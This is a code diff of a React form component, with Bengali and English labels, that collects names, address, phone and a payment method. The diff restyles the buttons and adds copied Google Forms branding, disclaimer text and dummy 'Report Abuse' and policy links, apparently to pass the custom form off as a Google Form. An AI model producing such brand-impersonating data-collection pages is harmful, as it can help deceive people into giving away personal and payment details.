@@ -309,25 +638,26 @@ export default function OnlineForm({ isStandalonePage = false }) {
               <button
                 type="submit"
                 disabled={isSubmitting}
-                className="button primary gform-submit-btn"
+                className="gform-google-submit-btn"
               >
-                {isSubmitting ? 'প্রসেসিং হচ্ছে...' : 'ফর্ম জমা দিন (Submit Form) →'}
+                {isSubmitting ? 'প্রসেসিং হচ্ছে...' : 'Submit (আবেদন জমা দিন)'}
               </button>
+
               <button
-                type="reset"
-                className="gform-clear-btn"
-                onClick={() => {
-                  setFormData({
-                    name: '',
-                    familyMembersName: '',
-                    address: '',
-                    phone: '',
-                    paymentMethod: 'Mastercard'
-                  });
-                }}
+                type="button"
+                className="gform-clear-form-btn"
+                onClick={resetForm}
               >
-                ফর্ম ক্লিয়ার করুন
+                Clear form (ফর্ম ক্লিয়ার করুন)
               </button>
+            </div>
+
+            <div className="gform-footer-disclaimer">
+              <span>Never submit passwords through Google Forms.</span>
+              <p>This content is neither created nor endorsed by Google. - <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></p>
+              <div className="gform-google-branding">
+                <strong>Google</strong> Forms
+              </div>
             </div>
           </form>
         )}
